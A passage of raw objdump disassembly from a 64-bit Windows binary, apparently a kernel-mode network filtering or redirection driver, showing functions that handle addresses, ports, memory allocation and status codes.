   14000571d:	8b 05 ad 1f 00 00    	mov    0x1fad(%rip),%eax        # 0x1400076d0
   140005723:	89 85 c8 00 00 00    	mov    %eax,0xc8(%rbp)
   140005729:	0f b7 05 a4 1f 00 00 	movzwl 0x1fa4(%rip),%eax        # 0x1400076d4
   140005730:	f2 0f 11 85 d0 00 00 	movsd  %xmm0,0xd0(%rbp)
   140005737:	00 
   140005738:	0f 10 05 f9 2c 00 00 	movups 0x2cf9(%rip),%xmm0        # 0x140008438
   14000573f:	66 89 85 cc 00 00 00 	mov    %ax,0xcc(%rbp)
   140005746:	48 8d 85 c8 00 00 00 	lea    0xc8(%rbp),%rax
   14000574d:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   140005751:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140005756:	f3 0f 7f 45 d0       	movdqu %xmm0,-0x30(%rbp)
   14000575b:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000575f:	0f 10 05 9a 2c 00 00 	movups 0x2c9a(%rip),%xmm0        # 0x140008400
   140005766:	c7 45 00 03 50 00 00 	movl   $0x5003,0x0(%rbp)
   14000576d:	c7 45 e0 04 00 00 00 	movl   $0x4,-0x20(%rbp)
   140005774:	f3 0f 7f 45 c0       	movdqu %xmm0,-0x40(%rbp)
   140005779:	f3 0f 7f 4d 04       	movdqu %xmm1,0x4(%rbp)
   14000577e:	e8 d6 17 00 00       	call   0x140006f59
   140005783:	8b d8                	mov    %eax,%ebx
   140005785:	85 c0                	test   %eax,%eax
   140005787:	0f 85 99 fe ff ff    	jne    0x140005626
   14000578d:	48 8b 8d e8 00 00 00 	mov    0xe8(%rbp),%rcx
   140005794:	48 33 cc             	xor    %rsp,%rcx
   140005797:	e8 14 19 00 00       	call   0x1400070b0
   14000579c:	48 8b 9c 24 00 02 00 	mov    0x200(%rsp),%rbx
   1400057a3:	00 
   1400057a4:	48 81 c4 f0 01 00 00 	add    $0x1f0,%rsp
   1400057ab:	5d                   	pop    %rbp
   1400057ac:	c3                   	ret
   1400057ad:	cc                   	int3
   1400057ae:	cc                   	int3
   1400057af:	cc                   	int3
   1400057b0:	40 53                	rex push %rbx
   1400057b2:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400057b9:	48 8b 05 f0 5f 00 00 	mov    0x5ff0(%rip),%rax        # 0x14000b7b0
   1400057c0:	48 33 c4             	xor    %rsp,%rax
   1400057c3:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400057ca:	00 
   1400057cb:	33 d2                	xor    %edx,%edx
   1400057cd:	48 8b d9             	mov    %rcx,%rbx
   1400057d0:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400057d5:	44 8d 42 48          	lea    0x48(%rdx),%r8d
   1400057d9:	e8 a2 1c 00 00       	call   0x140007480
   1400057de:	45 33 c0             	xor    %r8d,%r8d
   1400057e1:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   1400057e8:	00 
   1400057e9:	48 8d 05 38 a4 00 00 	lea    0xa438(%rip),%rax        # 0x14000fc28
   1400057f0:	33 c9                	xor    %ecx,%ecx
   1400057f2:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400057f7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400057fc:	41 8d 50 0a          	lea    0xa(%r8),%edx
   140005800:	e8 24 17 00 00       	call   0x140006f29
   140005805:	85 c0                	test   %eax,%eax
   140005807:	78 52                	js     0x14000585b
   140005809:	48 8b 0d 18 a4 00 00 	mov    0xa418(%rip),%rcx        # 0x14000fc28
   140005810:	33 d2                	xor    %edx,%edx
   140005812:	e8 1e 17 00 00       	call   0x140006f35
   140005817:	85 c0                	test   %eax,%eax
   140005819:	78 40                	js     0x14000585b
   14000581b:	48 8b cb             	mov    %rbx,%rcx
   14000581e:	e8 bd fc ff ff       	call   0x1400054e0
   140005823:	8b d8                	mov    %eax,%ebx
   140005825:	85 c0                	test   %eax,%eax
   140005827:	79 0e                	jns    0x140005837
   140005829:	48 8b 0d f8 a3 00 00 	mov    0xa3f8(%rip),%rcx        # 0x14000fc28
   140005830:	e8 0c 17 00 00       	call   0x140006f41
   140005835:	eb 22                	jmp    0x140005859
   140005837:	e8 30 fd ff ff       	call   0x14000556c
   14000583c:	48 8b 0d e5 a3 00 00 	mov    0xa3e5(%rip),%rcx        # 0x14000fc28
   140005843:	e8 f3 16 00 00       	call   0x140006f3b
   140005848:	8b d8                	mov    %eax,%ebx
   14000584a:	85 c0                	test   %eax,%eax
   14000584c:	79 0b                	jns    0x140005859
   14000584e:	8b 0d dc a3 00 00    	mov    0xa3dc(%rip),%ecx        # 0x14000fc30
   140005854:	e8 ca 16 00 00       	call   0x140006f23
   140005859:	8b c3                	mov    %ebx,%eax
   14000585b:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140005862:	00 
   140005863:	48 33 cc             	xor    %rsp,%rcx
   140005866:	e8 45 18 00 00       	call   0x1400070b0
   14000586b:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140005872:	5b                   	pop    %rbx
   140005873:	c3                   	ret
   140005874:	48 83 ec 28          	sub    $0x28,%rsp
   140005878:	48 8b 0d a9 a3 00 00 	mov    0xa3a9(%rip),%rcx        # 0x14000fc28
   14000587f:	48 85 c9             	test   %rcx,%rcx
   140005882:	74 40                	je     0x1400058c4
   140005884:	48 8b 15 ad a3 00 00 	mov    0xa3ad(%rip),%rdx        # 0x14000fc38
   14000588b:	48 85 d2             	test   %rdx,%rdx
   14000588e:	74 05                	je     0x140005895
   140005890:	e8 ca 16 00 00       	call   0x140006f5f
   140005895:	48 8b 0d 8c a3 00 00 	mov    0xa38c(%rip),%rcx        # 0x14000fc28
   14000589c:	48 8d 15 95 2b 00 00 	lea    0x2b95(%rip),%rdx        # 0x140008438
   1400058a3:	e8 a5 16 00 00       	call   0x140006f4d
   1400058a8:	8b 0d 82 a3 00 00    	mov    0xa382(%rip),%ecx        # 0x14000fc30
   1400058ae:	e8 70 16 00 00       	call   0x140006f23
   1400058b3:	48 8b 0d 6e a3 00 00 	mov    0xa36e(%rip),%rcx        # 0x14000fc28
   1400058ba:	48 85 c9             	test   %rcx,%rcx
   1400058bd:	74 05                	je     0x1400058c4
   1400058bf:	e8 6b 16 00 00       	call   0x140006f2f
   1400058c4:	48 83 c4 28          	add    $0x28,%rsp
   1400058c8:	c3                   	ret
   1400058c9:	cc                   	int3
   1400058ca:	cc                   	int3
   1400058cb:	cc                   	int3
   1400058cc:	cc                   	int3
   1400058cd:	cc                   	int3
   1400058ce:	cc                   	int3
   1400058cf:	cc                   	int3
   1400058d0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400058d5:	55                   	push   %rbp
   1400058d6:	56                   	push   %rsi
   1400058d7:	57                   	push   %rdi
   1400058d8:	48 8d 6c 24 d1       	lea    -0x2f(%rsp),%rbp
   1400058dd:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   1400058e4:	48 8b 05 c5 5e 00 00 	mov    0x5ec5(%rip),%rax        # 0x14000b7b0
   1400058eb:	48 33 c4             	xor    %rsp,%rax
   1400058ee:	48 89 45 1f          	mov    %rax,0x1f(%rbp)
   1400058f2:	48 83 65 b7 00       	andq   $0x0,-0x49(%rbp)
   1400058f7:	49 8b f1             	mov    %r9,%rsi
   1400058fa:	83 65 af 00          	andl   $0x0,-0x51(%rbp)
   1400058fe:	4c 8b 4d 6f          	mov    0x6f(%rbp),%r9
   140005902:	48 8b 5d 7f          	mov    0x7f(%rbp),%rbx
   140005906:	44 0f 20 c0          	mov    %cr8,%rax
   14000590a:	84 c0                	test   %al,%al
   14000590c:	0f 85 e1 00 00 00    	jne    0x1400059f3
   140005912:	8b 05 68 5f 00 00    	mov    0x5f68(%rip),%eax        # 0x14000b880
   140005918:	85 c0                	test   %eax,%eax
   14000591a:	0f 84 d3 00 00 00    	je     0x1400059f3
   140005920:	4d 85 c0             	test   %r8,%r8
   140005923:	0f 84 ca 00 00 00    	je     0x1400059f3
   140005929:	8b 43 18             	mov    0x18(%rbx),%eax
   14000592c:	a8 01                	test   $0x1,%al
   14000592e:	0f 84 bf 00 00 00    	je     0x1400059f3
   140005934:	66 83 39 42          	cmpw   $0x42,(%rcx)
   140005938:	48 8b 42 40          	mov    0x40(%rdx),%rax
   14000593c:	48 89 45 cf          	mov    %rax,-0x31(%rbp)
   140005940:	c7 45 d7 ff ff 00 00 	movl   $0xffff,-0x29(%rbp)
   140005947:	0f 85 a0 00 00 00    	jne    0x1400059ed
   14000594d:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140005951:	48 8d 55 af          	lea    -0x51(%rbp),%rdx
   140005955:	c7 45 bf 04 00 00 00 	movl   $0x4,-0x41(%rbp)
   14000595c:	8b 41 28             	mov    0x28(%rcx),%eax
   14000595f:	89 45 c3             	mov    %eax,-0x3d(%rbp)
   140005962:	0f b7 41 48          	movzwl 0x48(%rcx),%eax
   140005966:	44 8b 41 68          	mov    0x68(%rcx),%r8d
   14000596a:	66 89 45 cb          	mov    %ax,-0x35(%rbp)
   14000596e:	0f b7 81 88 00 00 00 	movzwl 0x88(%rcx),%eax
   140005975:	c7 03 02 10 00 00    	movl   $0x1002,(%rbx)
   14000597b:	0f 10 03             	movups (%rbx),%xmm0
   14000597e:	66 89 45 cd          	mov    %ax,-0x33(%rbp)
   140005982:	0f 10 4b 10          	movups 0x10(%rbx),%xmm1
   140005986:	49 8b 01             	mov    (%r9),%rax
   140005989:	0f 29 45 ef          	movaps %xmm0,-0x11(%rbp)
   14000598d:	f2 0f 10 43 20       	movsd  0x20(%rbx),%xmm0
   140005992:	41 0f c8             	bswap  %r8d
   140005995:	41 8b c8             	mov    %r8d,%ecx
   140005998:	f2 0f 11 45 0f       	movsd  %xmm0,0xf(%rbp)
   14000599d:	0f 29 4d ff          	movaps %xmm1,-0x1(%rbp)
   1400059a1:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   1400059a5:	e8 e2 e4 ff ff       	call   0x140003e8c
   1400059aa:	8b f8                	mov    %eax,%edi
   1400059ac:	85 c0                	test   %eax,%eax
   1400059ae:	74 43                	je     0x1400059f3
   1400059b0:	4c 8d 45 b7          	lea    -0x49(%rbp),%r8
   1400059b4:	33 d2                	xor    %edx,%edx
   1400059b6:	48 8b ce             	mov    %rsi,%rcx
   1400059b9:	e8 a7 15 00 00       	call   0x140006f65
   1400059be:	85 c0                	test   %eax,%eax
   1400059c0:	75 2b                	jne    0x1400059ed
   1400059c2:	48 8b 4d b7          	mov    -0x49(%rbp),%rcx
   1400059c6:	b2 01                	mov    $0x1,%dl
   1400059c8:	8b 45 af             	mov    -0x51(%rbp),%eax
   1400059cb:	85 c0                	test   %eax,%eax
   1400059cd:	48 89 4d df          	mov    %rcx,-0x21(%rbp)
   1400059d1:	0f b7 4d cd          	movzwl -0x33(%rbp),%ecx
   1400059d5:	66 0f 45 c8          	cmovne %ax,%cx
   1400059d9:	66 89 4d cd          	mov    %cx,-0x33(%rbp)
   1400059dd:	48 8d 4d bf          	lea    -0x41(%rbp),%rcx
   1400059e1:	0f cf                	bswap  %edi
   1400059e3:	89 7d c7             	mov    %edi,-0x39(%rbp)
   1400059e6:	e8 39 00 00 00       	call   0x140005a24
   1400059eb:	eb 06                	jmp    0x1400059f3
   1400059ed:	c7 03 02 10 00 00    	movl   $0x1002,(%rbx)
   1400059f3:	48 8b 4d 1f          	mov    0x1f(%rbp),%rcx
   1400059f7:	48 33 cc             	xor    %rsp,%rcx
   1400059fa:	e8 b1 16 00 00       	call   0x1400070b0
   1400059ff:	48 8b 9c 24 d0 00 00 	mov    0xd0(%rsp),%rbx
   140005a06:	00 
   140005a07:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   140005a0e:	5f                   	pop    %rdi
   140005a0f:	5e                   	pop    %rsi
   140005a10:	5d                   	pop    %rbp
   140005a11:	c3                   	ret
   140005a12:	cc                   	int3
   140005a13:	cc                   	int3
   140005a14:	cc                   	int3
   140005a15:	cc                   	int3
   140005a16:	cc                   	int3
   140005a17:	cc                   	int3
   140005a18:	cc                   	int3
   140005a19:	cc                   	int3
   140005a1a:	cc                   	int3
   140005a1b:	cc                   	int3
   140005a1c:	cc                   	int3
   140005a1d:	cc                   	int3
   140005a1e:	cc                   	int3
   140005a1f:	cc                   	int3
   140005a20:	33 c0                	xor    %eax,%eax
   140005a22:	c3                   	ret
   140005a23:	cc                   	int3
   140005a24:	48 8b c4             	mov    %rsp,%rax
   140005a27:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140005a2b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005a2f:	57                   	push   %rdi
   140005a30:	48 83 ec 30          	sub    $0x30,%rsp
   140005a34:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   140005a39:	48 8d 79 30          	lea    0x30(%rcx),%rdi
   140005a3d:	40 8a f2             	mov    %dl,%sil
   140005a40:	48 89 78 e8          	mov    %rdi,-0x18(%rax)
   140005a44:	48 8b 51 28          	mov    0x28(%rcx),%rdx
   140005a48:	4c 8d 48 08          	lea    0x8(%rax),%r9
   140005a4c:	48 8b d9             	mov    %rcx,%rbx
   140005a4f:	45 33 c0             	xor    %r8d,%r8d
   140005a52:	48 8b 49 20          	mov    0x20(%rcx),%rcx
   140005a56:	e8 1c 15 00 00       	call   0x140006f77
   140005a5b:	85 c0                	test   %eax,%eax
   140005a5d:	74 11                	je     0x140005a70
   140005a5f:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140005a63:	e8 03 15 00 00       	call   0x140006f6b
   140005a68:	c7 07 02 10 00 00    	movl   $0x1002,(%rdi)
   140005a6e:	eb 7b                	jmp    0x140005aeb
   140005a70:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140005a75:	40 84 f6             	test   %sil,%sil
   140005a78:	74 41                	je     0x140005abb
   140005a7a:	83 3b 04             	cmpl   $0x4,(%rbx)
   140005a7d:	75 2e                	jne    0x140005aad
   140005a7f:	8b 43 08             	mov    0x8(%rbx),%eax
   140005a82:	0f c8                	bswap  %eax
   140005a84:	89 82 84 00 00 00    	mov    %eax,0x84(%rdx)
   140005a8a:	0f b7 43 0e          	movzwl 0xe(%rbx),%eax
   140005a8e:	66 c1 c8 08          	ror    $0x8,%ax
   140005a92:	66 89 82 82 00 00 00 	mov    %ax,0x82(%rdx)
   140005a99:	8b 43 04             	mov    0x4(%rbx),%eax
   140005a9c:	0f c8                	bswap  %eax
   140005a9e:	89 42 04             	mov    %eax,0x4(%rdx)
   140005aa1:	0f b7 43 0c          	movzwl 0xc(%rbx),%eax
   140005aa5:	66 c1 c8 08          	ror    $0x8,%ax
   140005aa9:	66 89 42 02          	mov    %ax,0x2(%rdx)
   140005aad:	8b 43 18             	mov    0x18(%rbx),%eax
   140005ab0:	89 82 08 01 00 00    	mov    %eax,0x108(%rdx)
   140005ab6:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140005abb:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140005abf:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140005ac5:	e8 b3 14 00 00       	call   0x140006f7d
   140005aca:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140005ace:	4c 8b c7             	mov    %rdi,%r8
   140005ad1:	83 4b 48 01          	orl    $0x1,0x48(%rbx)
   140005ad5:	33 d2                	xor    %edx,%edx
   140005ad7:	c7 07 02 10 00 00    	movl   $0x1002,(%rdi)
   140005add:	e8 8f 14 00 00       	call   0x140006f71
   140005ae2:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140005ae6:	e8 80 14 00 00       	call   0x140006f6b
   140005aeb:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140005af0:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005af5:	48 83 c4 30          	add    $0x30,%rsp
   140005af9:	5f                   	pop    %rdi
   140005afa:	c3                   	ret
   140005afb:	cc                   	int3
   140005afc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005b01:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005b06:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005b0b:	41 56                	push   %r14
   140005b0d:	48 83 ec 40          	sub    $0x40,%rsp
   140005b11:	4c 8b f2             	mov    %rdx,%r14
   140005b14:	48 8b f1             	mov    %rcx,%rsi
   140005b17:	48 85 c9             	test   %rcx,%rcx
   140005b1a:	75 0a                	jne    0x140005b26
   140005b1c:	48 21 0a             	and    %rcx,(%rdx)
   140005b1f:	33 c0                	xor    %eax,%eax
   140005b21:	e9 d5 00 00 00       	jmp    0x140005bfb
   140005b26:	bf 48 00 00 00       	mov    $0x48,%edi
   140005b2b:	41 b8 7a 63 64 76    	mov    $0x7664637a,%r8d
   140005b31:	8b d7                	mov    %edi,%edx
   140005b33:	8d 4f b9             	lea    -0x47(%rdi),%ecx
   140005b36:	ff 15 cc 27 00 00    	call   *0x27cc(%rip)        # 0x140008308
   140005b3c:	48 8b d8             	mov    %rax,%rbx
   140005b3f:	48 85 c0             	test   %rax,%rax
   140005b42:	0f 84 ac 00 00 00    	je     0x140005bf4
   140005b48:	48 8b c8             	mov    %rax,%rcx
   140005b4b:	ff 15 27 26 00 00    	call   *0x2627(%rip)        # 0x140008178
   140005b51:	84 c0                	test   %al,%al
   140005b53:	0f 84 9b 00 00 00    	je     0x140005bf4
   140005b59:	44 8b c7             	mov    %edi,%r8d
   140005b5c:	33 d2                	xor    %edx,%edx
   140005b5e:	48 8b cb             	mov    %rbx,%rcx
   140005b61:	e8 1a 19 00 00       	call   0x140007480
   140005b66:	8b 0e                	mov    (%rsi),%ecx
   140005b68:	89 0b                	mov    %ecx,(%rbx)
   140005b6a:	8b 46 04             	mov    0x4(%rsi),%eax
   140005b6d:	89 43 04             	mov    %eax,0x4(%rbx)
   140005b70:	8b 46 08             	mov    0x8(%rsi),%eax
   140005b73:	89 43 08             	mov    %eax,0x8(%rbx)
   140005b76:	8b 46 0c             	mov    0xc(%rsi),%eax
   140005b79:	89 43 0c             	mov    %eax,0xc(%rbx)
   140005b7c:	48 8b 46 10          	mov    0x10(%rsi),%rax
   140005b80:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140005b84:	48 8b 56 18          	mov    0x18(%rsi),%rdx
   140005b88:	48 85 d2             	test   %rdx,%rdx
   140005b8b:	74 2d                	je     0x140005bba
   140005b8d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005b92:	ff 15 18 26 00 00    	call   *0x2618(%rip)        # 0x1400081b0
   140005b98:	41 b0 01             	mov    $0x1,%r8b
   140005b9b:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005ba0:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005ba5:	ff 15 45 26 00 00    	call   *0x2645(%rip)        # 0x1400081f0
   140005bab:	8b f8                	mov    %eax,%edi
   140005bad:	85 c0                	test   %eax,%eax
   140005baf:	78 25                	js     0x140005bd6
   140005bb1:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140005bb6:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140005bba:	48 8b 46 20          	mov    0x20(%rsi),%rax
   140005bbe:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140005bc3:	48 89 43 20          	mov    %rax,0x20(%rbx)
   140005bc7:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   140005bcb:	e8 2c ff ff ff       	call   0x140005afc
   140005bd0:	8b f8                	mov    %eax,%edi
   140005bd2:	85 c0                	test   %eax,%eax
   140005bd4:	79 10                	jns    0x140005be6
   140005bd6:	ba 7a 63 64 76       	mov    $0x7664637a,%edx
   140005bdb:	48 8b cb             	mov    %rbx,%rcx
   140005bde:	ff 15 5c 27 00 00    	call   *0x275c(%rip)        # 0x140008340
   140005be4:	eb 13                	jmp    0x140005bf9
   140005be6:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140005beb:	48 89 43 40          	mov    %rax,0x40(%rbx)
   140005bef:	49 89 1e             	mov    %rbx,(%r14)
   140005bf2:	eb 05                	jmp    0x140005bf9
   140005bf4:	bf 9a 00 00 c0       	mov    $0xc000009a,%edi
   140005bf9:	8b c7                	mov    %edi,%eax
   140005bfb:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140005c00:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140005c05:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140005c0a:	48 83 c4 40          	add    $0x40,%rsp
   140005c0e:	41 5e                	pop    %r14
   140005c10:	c3                   	ret
   140005c11:	cc                   	int3
   140005c12:	cc                   	int3
   140005c13:	cc                   	int3
   140005c14:	40 53                	rex push %rbx
   140005c16:	48 83 ec 30          	sub    $0x30,%rsp
   140005c1a:	48 8b d9             	mov    %rcx,%rbx
   140005c1d:	48 8b 49 40          	mov    0x40(%rcx),%rcx
   140005c21:	48 85 c9             	test   %rcx,%rcx
   140005c24:	74 05                	je     0x140005c2b
   140005c26:	e8 e9 ff ff ff       	call   0x140005c14
   140005c2b:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140005c2f:	48 85 d2             	test   %rdx,%rdx
   140005c32:	74 0b                	je     0x140005c3f
   140005c34:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005c39:	ff 15 09 27 00 00    	call   *0x2709(%rip)        # 0x140008348
   140005c3f:	ba 7a 63 64 76       	mov    $0x7664637a,%edx
   140005c44:	48 8b cb             	mov    %rbx,%rcx
   140005c47:	48 83 c4 30          	add    $0x30,%rsp
   140005c4b:	5b                   	pop    %rbx
   140005c4c:	48 ff 25 ed 26 00 00 	rex.W jmp *0x26ed(%rip)        # 0x140008340
   140005c53:	cc                   	int3
   140005c54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005c59:	57                   	push   %rdi
   140005c5a:	48 83 ec 20          	sub    $0x20,%rsp
   140005c5e:	48 63 d9             	movslq %ecx,%rbx
   140005c61:	48 8d 3d d8 9f 00 00 	lea    0x9fd8(%rip),%rdi        # 0x14000fc40
   140005c68:	48 8b 4c df f8       	mov    -0x8(%rdi,%rbx,8),%rcx
   140005c6d:	e8 22 0b 00 00       	call   0x140006794
   140005c72:	33 c9                	xor    %ecx,%ecx
   140005c74:	85 c0                	test   %eax,%eax
   140005c76:	48 89 4c df f8       	mov    %rcx,-0x8(%rdi,%rbx,8)
   140005c7b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005c80:	0f 99 c1             	setns  %cl
   140005c83:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140005c86:	48 83 c4 20          	add    $0x20,%rsp
   140005c8a:	5f                   	pop    %rdi
   140005c8b:	c3                   	ret
   140005c8c:	48 83 ec 28          	sub    $0x28,%rsp
   140005c90:	48 63 c1             	movslq %ecx,%rax
   140005c93:	48 8d 0d a6 9f 00 00 	lea    0x9fa6(%rip),%rcx        # 0x14000fc40
   140005c9a:	48 8b 4c c1 f8       	mov    -0x8(%rcx,%rax,8),%rcx
   140005c9f:	e8 6c 0b 00 00       	call   0x140006810
   140005ca4:	33 c9                	xor    %ecx,%ecx
   140005ca6:	85 c0                	test   %eax,%eax
   140005ca8:	0f 99 c1             	setns  %cl
   140005cab:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140005cae:	48 83 c4 28          	add    $0x28,%rsp
   140005cb2:	c3                   	ret
   140005cb3:	cc                   	int3
   140005cb4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005cb9:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005cbe:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005cc3:	55                   	push   %rbp
   140005cc4:	41 56                	push   %r14
   140005cc6:	41 57                	push   %r15
   140005cc8:	48 8b ec             	mov    %rsp,%rbp
   140005ccb:	48 83 ec 70          	sub    $0x70,%rsp
   140005ccf:	45 33 ff             	xor    %r15d,%r15d
   140005cd2:	49 8b f9             	mov    %r9,%rdi
   140005cd5:	44 89 7d d8          	mov    %r15d,-0x28(%rbp)
   140005cd9:	49 8b f0             	mov    %r8,%rsi
   140005cdc:	4c 89 7d e0          	mov    %r15,-0x20(%rbp)
   140005ce0:	4c 8b f2             	mov    %rdx,%r14
   140005ce3:	44 89 7d c8          	mov    %r15d,-0x38(%rbp)
   140005ce7:	4c 89 7d d0          	mov    %r15,-0x30(%rbp)
   140005ceb:	44 89 7d e8          	mov    %r15d,-0x18(%rbp)
   140005cef:	4c 89 7d f0          	mov    %r15,-0x10(%rbp)
   140005cf3:	44 89 7d b8          	mov    %r15d,-0x48(%rbp)
   140005cf7:	4c 89 7d c0          	mov    %r15,-0x40(%rbp)
   140005cfb:	48 85 c9             	test   %rcx,%rcx
   140005cfe:	0f 84 15 01 00 00    	je     0x140005e19
   140005d04:	48 85 d2             	test   %rdx,%rdx
   140005d07:	0f 84 0c 01 00 00    	je     0x140005e19
   140005d0d:	4d 85 c0             	test   %r8,%r8
   140005d10:	0f 84 03 01 00 00    	je     0x140005e19
   140005d16:	4d 85 c9             	test   %r9,%r9
   140005d19:	0f 84 fa 00 00 00    	je     0x140005e19
   140005d1f:	48 8b d1             	mov    %rcx,%rdx
   140005d22:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140005d26:	ff 15 84 24 00 00    	call   *0x2484(%rip)        # 0x1400081b0
   140005d2c:	41 b0 01             	mov    $0x1,%r8b
   140005d2f:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140005d33:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140005d37:	ff 15 b3 24 00 00    	call   *0x24b3(%rip)        # 0x1400081f0
   140005d3d:	8b d8                	mov    %eax,%ebx
   140005d3f:	85 c0                	test   %eax,%eax
   140005d41:	0f 88 ce 00 00 00    	js     0x140005e15
   140005d47:	49 8b d6             	mov    %r14,%rdx
   140005d4a:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   140005d4e:	ff 15 5c 24 00 00    	call   *0x245c(%rip)        # 0x1400081b0
   140005d54:	41 b0 01             	mov    $0x1,%r8b
   140005d57:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   140005d5b:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140005d5f:	ff 15 8b 24 00 00    	call   *0x248b(%rip)        # 0x1400081f0
   140005d65:	8b d8                	mov    %eax,%ebx
   140005d67:	85 c0                	test   %eax,%eax
   140005d69:	0f 88 96 00 00 00    	js     0x140005e05
   140005d6f:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140005d73:	48 8b ce             	mov    %rsi,%rcx
   140005d76:	e8 81 fd ff ff       	call   0x140005afc
   140005d7b:	8b d8                	mov    %eax,%ebx
   140005d7d:	85 c0                	test   %eax,%eax
   140005d7f:	78 74                	js     0x140005df5
   140005d81:	4c 8b 45 20          	mov    0x20(%rbp),%r8
   140005d85:	4c 8d 4d b0          	lea    -0x50(%rbp),%r9
   140005d89:	48 8d 55 b8          	lea    -0x48(%rbp),%rdx
   140005d8d:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140005d91:	e8 be 0c 00 00       	call   0x140006a54
   140005d96:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140005d9a:	8b d8                	mov    %eax,%ebx
   140005d9c:	e8 73 fe ff ff       	call   0x140005c14
   140005da1:	85 db                	test   %ebx,%ebx
   140005da3:	78 50                	js     0x140005df5
   140005da5:	4c 8b 45 b0          	mov    -0x50(%rbp),%r8
   140005da9:	45 8d 4f 04          	lea    0x4(%r15),%r9d
   140005dad:	49 8b 40 20          	mov    0x20(%r8),%rax
   140005db1:	0f b7 10             	movzwl (%rax),%edx
   140005db4:	66 89 17             	mov    %dx,(%rdi)
   140005db7:	49 8b 40 20          	mov    0x20(%r8),%rax
   140005dbb:	0f b7 48 02          	movzwl 0x2(%rax),%ecx
   140005dbf:	41 8d 47 08          	lea    0x8(%r15),%eax
   140005dc3:	66 89 4f 02          	mov    %cx,0x2(%rdi)
   140005dc7:	49 8b 48 20          	mov    0x20(%r8),%rcx
   140005dcb:	66 83 39 17          	cmpw   $0x17,(%rcx)
   140005dcf:	41 0f 45 c1          	cmovne %r9d,%eax
   140005dd3:	66 83 fa 17          	cmp    $0x17,%dx
   140005dd7:	75 0b                	jne    0x140005de4
   140005dd9:	0f 10 04 08          	movups (%rax,%rcx,1),%xmm0
   140005ddd:	f3 0f 7f 47 08       	movdqu %xmm0,0x8(%rdi)
   140005de2:	eb 06                	jmp    0x140005dea
   140005de4:	8b 04 08             	mov    (%rax,%rcx,1),%eax
   140005de7:	89 47 04             	mov    %eax,0x4(%rdi)
   140005dea:	49 8b c8             	mov    %r8,%rcx
   140005ded:	e8 46 0c 00 00       	call   0x140006a38
   140005df2:	41 8b df             	mov    %r15d,%ebx
   140005df5:	4c 39 7d c0          	cmp    %r15,-0x40(%rbp)
   140005df9:	74 0a                	je     0x140005e05
   140005dfb:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140005dff:	ff 15 f3 23 00 00    	call   *0x23f3(%rip)        # 0x1400081f8
   140005e05:	4c 39 7d d0          	cmp    %r15,-0x30(%rbp)
   140005e09:	74 0a                	je     0x140005e15
   140005e0b:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140005e0f:	ff 15 e3 23 00 00    	call   *0x23e3(%rip)        # 0x1400081f8
   140005e15:	8b c3                	mov    %ebx,%eax
   140005e17:	eb 03                	jmp    0x140005e1c
   140005e19:	83 c8 ff             	or     $0xffffffff,%eax
   140005e1c:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
